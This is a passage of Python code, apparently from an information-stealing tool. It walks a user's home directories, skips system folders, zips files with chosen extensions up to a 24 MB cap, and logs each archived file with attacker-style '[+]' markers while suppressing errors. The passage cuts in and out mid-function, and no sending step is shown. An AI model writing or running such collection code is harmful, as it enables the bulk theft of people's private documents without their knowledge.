        exclude_dirs = ["AppData", "Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin"]
        total_size = 0
        max_size = 24 * 1024 * 1024
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for user_dir in user_dirs:
                for root, _, files in os.walk(user_dir):
                    if any(exclude in root for exclude in exclude_dirs):
                        continue
                    for file in files:
                        if any(file.lower().endswith(ext) for ext in allowed_extensions):
                            file_path = os.path.join(root, file)
                            try:
                                file_size = os.path.getsize(file_path)
                                if total_size + file_size < max_size:
                                    arcname = os.path.relpath(file_path, os.path.expanduser("~"))
                                    zipf.write(file_path, arcname)
                                    total_size += file_size
                                    with open(log_path, "a") as f:
                                        f.write(f"[+] Archived file: {file_path}\n")
                            except:
                                pass
        with open(log_path, "a") as f:
            f.write(f"[+] Archive created: {zip_path}, size: {total_size} bytes\n")
        return zip_path if total_size > 0 else "[-] No files found to archive"
    except Exception as e:
        with open(log_path, "a") as f:
            f.write(f"[-] Archive failed: {e}\n")
